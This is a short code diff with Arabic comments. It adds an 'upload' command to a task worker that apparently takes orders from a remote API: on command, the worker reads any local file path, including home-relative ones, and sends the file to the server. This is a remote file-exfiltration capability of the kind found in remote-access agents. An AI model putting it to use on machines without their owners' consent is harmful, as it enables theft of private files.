@@ -380,6 +380,42 @@ def execute_task(task: Dict[str, Any], api: WorkerAPI) -> None:
     if task["status"] == "pending":
         api.start_task(task["id"])
 
+    # --- معالجة أمر الرفع ---
+    if command.lower().startswith('upload'):
+        # استخراج المسار: نفترض أن التنسيق "upload <path>"
+        parts = command.split(maxsplit=1)
+        if len(parts) < 2:
+            report_content = "خطأ: لم يتم تحديد مسار الملف بعد الأمر 'upload'."
+            if not api.report(task_id, report_content):
+                queue_report(task_id, report_content)
+            return
+
+        file_path = parts[1].strip()
+        # تدعيم المسارات النسبية (نسبة إلى المجلد الحالي أو HOME)
+        path_obj = Path(file_path).expanduser().resolve()
+
+        if not path_obj.is_file():
+            report_content = f"error uploading {path_obj}"
+            if not api.report(task_id, report_content):
+                queue_report(task_id, report_content)
+            return
+
+        # محاولة الرفع
+        try:
+            
+
+            upload_result = api.upload(task_id, path_obj)
+            # نأخذ رسالة النجاح من الرد (إن وُجدت)
+            report_content = f"file uploaded: {path_obj.name}"
+            # يمكن إضافة تفاصيل إضافية من upload_result إذا أردت
+        except Exception as e:
+            report_content = f"unuploaded: {str(e)}"
+
+        # إرسال التقرير النهائي
+        if not api.report(task_id, report_content):
+            queue_report(task_id, report_content)
+        return
+
 
     proc = None
     report_content = ""
